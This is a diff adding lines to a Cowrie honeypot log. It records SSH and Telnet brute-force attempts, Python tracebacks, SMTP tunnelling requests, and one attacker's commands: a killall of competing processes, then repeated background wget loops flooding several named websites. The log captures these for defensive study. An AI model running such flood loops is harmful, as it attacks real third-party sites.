@@ -4000,3 +4000,171 @@
 2017-03-30T02:16:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60651,193.70.80.72] 'charleene' trying auth 'password'
 2017-03-30T02:16:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60651,193.70.80.72] login attempt: 68
 2017-03-30T02:16:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60651,193.70.80.72] login return, expect: [xerox/xerox123]
+2017-03-30T02:16:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60651,193.70.80.72] login attempt [charleene/charleene] failed
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: killall wget; killall ping; killall sh
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: killall wget
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: killall ping
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: killall sh
+2017-03-30T02:16:02+0000 [CowrieTelnetTransport,149210,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-30T02:16:03+0000 [HoneyPotSSHTransport,60651,193.70.80.72] connection lost
+2017-03-30T02:16:03+0000 [HoneyPotSSHTransport,60651,193.70.80.72] Connection lost after 3 seconds
+2017-03-30T02:16:03+0000 [-] 'charleene' failed auth 'password'
+2017-03-30T02:16:03+0000 [-] unauthorized login: 
+2017-03-30T02:16:03+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-03-30T02:16:03+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-03-30T02:16:12+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: shell
+2017-03-30T02:16:12+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: shell
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: enable
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: enable 
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: system
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: system
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh 
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: run
+2017-03-30T02:16:13+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: run
+2017-03-30T02:16:19+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 124.124.197.37:49815 (10.8.41.81:2222) [session: dead7f62]
+2017-03-30T02:16:19+0000 [HoneyPotSSHTransport,60652,124.124.197.37] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-03-30T02:16:19+0000 [HoneyPotSSHTransport,60652,124.124.197.37] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-30T02:16:19+0000 [HoneyPotSSHTransport,60652,124.124.197.37] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-30T02:16:19+0000 [HoneyPotSSHTransport,60652,124.124.197.37] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.theblackseeds.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.bestvaluestore.org:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:23+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.hairlosshelp.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done" &
+2017-03-30T02:16:24+0000 [CowrieTelnetTransport,149210,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.konkol-dachdeckerei-berlin.de:80/ > /dev/null 2> /dev/null; done"
+2017-03-30T02:16:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,60531,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-30T02:16:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,60531,194.88.106.181] direct-tcp connection request to 92.43.124.44:25 from localhost:5556
+2017-03-30T02:16:29+0000 [HoneyPotSSHTransport,60652,124.124.197.37] connection lost
+2017-03-30T02:16:29+0000 [HoneyPotSSHTransport,60652,124.124.197.37] Connection lost after 10 seconds
+2017-03-30T02:16:33+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,60511,194.88.107.18] got channel 'direct-tcpip' request
+2017-03-30T02:16:33+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,60511,194.88.107.18] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-03-30T02:16:42+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 193.70.80.72:9224 (10.8.41.81:2222) [session: 7c988b79]
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] NEW KEYS
+2017-03-30T02:16:42+0000 [HoneyPotSSHTransport,60653,193.70.80.72] starting service 'ssh-userauth'
+2017-03-30T02:16:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60653,193.70.80.72] 'jenkins' trying auth 'password'
+2017-03-30T02:16:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60653,193.70.80.72] login attempt: 69
+2017-03-30T02:16:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60653,193.70.80.72] login return, expect: [xerox/xerox123]
+2017-03-30T02:16:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,60653,193.70.80.72] login attempt [jenkins/jenkins] failed
+2017-03-30T02:16:46+0000 [HoneyPotSSHTransport,60653,193.70.80.72] connection lost
+2017-03-30T02:16:46+0000 [HoneyPotSSHTransport,60653,193.70.80.72] Connection lost after 3 seconds
+2017-03-30T02:16:47+0000 [-] 'jenkins' failed auth 'password'
+2017-03-30T02:16:47+0000 [-] unauthorized login: 
+2017-03-30T02:16:47+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-03-30T02:16:47+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-03-30T02:16:51+0000 [SSHChannel None (642) on SSHService 'ssh-connection' on HoneyPotSSHTransport,60531,194.88.106.181] remote eof
+2017-03-30T02:16:51+0000 [SSHChannel None (642) on SSHService 'ssh-connection' on HoneyPotSSHTransport,60531,194.88.106.181] remote close
+2017-03-30T02:16:51+0000 [SSHChannel None (642) on SSHService 'ssh-connection' on HoneyPotSSHTransport,60531,194.88.106.181] sending close 642
+2017-03-30T02:16:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 85.105.232.28:50599 (10.8.41.81:2223) [session: TT149211]
+2017-03-30T02:16:59+0000 [CowrieTelnetTransport,149211,85.105.232.28] first time for 85.105.232.28, need: 1
+2017-03-30T02:16:59+0000 [CowrieTelnetTransport,149211,85.105.232.28] login attempt: 1
+2017-03-30T02:17:00+0000 [CowrieTelnetTransport,149211,85.105.232.28] login attempt [root/juantech] succeeded
